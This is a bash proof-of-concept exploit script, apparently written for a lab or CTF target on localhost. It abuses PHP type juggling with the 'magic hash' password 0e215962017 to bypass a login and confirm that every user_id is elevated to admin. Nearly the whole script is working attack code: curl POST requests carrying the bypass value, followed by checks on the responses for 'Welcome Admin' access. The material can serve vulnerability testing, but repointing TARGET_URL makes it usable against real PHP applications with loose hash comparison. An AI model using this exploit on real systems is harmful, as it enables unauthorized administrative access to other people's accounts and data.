#!/bin/bash

# POC: Privilege Escalation - All Users Elevated to Admin via PHP Type Juggling
# This POC demonstrates that after authenticating via the magic hash bypass (0e215962017),
# ALL users receive ADMIN privileges regardless of their user_id parameter or intended role.

TARGET_URL="http://localhost"
MAGIC_HASH_PASSWORD="0e215962017"

echo "=== Privilege Escalation POC ==="
echo "Target: $TARGET_URL"
echo "Magic Hash Password: $MAGIC_HASH_PASSWORD"
echo ""

# Test 1: Authenticate as different user IDs and check if all receive Admin privileges
echo "Test 1: Testing privilege escalation with different user IDs"
echo "==========================================================="

declare -a USER_IDS=("1" "2" "guest" "user" "admin")

for user_id in "${USER_IDS[@]}"; do
    echo ""
    echo "Testing user_id=$user_id..."
    
    response=$(curl -s -X POST "$TARGET_URL/index.php?user=$user_id" \
        -d "password=$MAGIC_HASH_PASSWORD" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Check if response contains "Welcome Admin"
    if echo "$response" | grep -q "Welcome Admin"; then
        echo "  ✓ User $user_id ELEVATED TO ADMIN"
        echo "  Response contains: 'Welcome Admin'"
    else
        echo "  ✗ User $user_id did not receive Admin status"
    fi
    
    # Calculate response hash for comparison
    response_hash=$(echo "$response" | md5sum | cut -d' ' -f1)
    echo "  Response hash: $response_hash"
done

echo ""
echo "Test 2: Comparing response consistency across all users"
echo "======================================================="

# Store responses for all users in an array
declare -A responses
declare -a response_hashes

for user_id in "${USER_IDS[@]}"; do
    response=$(curl -s -X POST "$TARGET_URL/index.php?user=$user_id" \
        -d "password=$MAGIC_HASH_PASSWORD" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    responses[$user_id]="$response"
    hash=$(echo "$response" | md5sum | cut -d' ' -f1)
    response_hashes+=("$hash")
done

# Check if all responses are identical
echo "Response hashes:"
for i in "${!USER_IDS[@]}"; do
    echo "  User ${USER_IDS[$i]}: ${response_hashes[$i]}"
done

# Check if all hashes are the same
first_hash="${response_hashes[0]}"
all_identical=true
for hash in "${response_hashes[@]}"; do
    if [ "$hash" != "$first_hash" ]; then
        all_identical=false
        break
    fi
done

if [ "$all_identical" = true ]; then
    echo ""
    echo "✓ VULNERABILITY CONFIRMED: All users receive identical responses"
    echo "  All users receive the same vault access regardless of user_id"
    exit 0
else
    echo ""
    echo "✗ Different responses detected - may not be vulnerable"
    exit 1
fi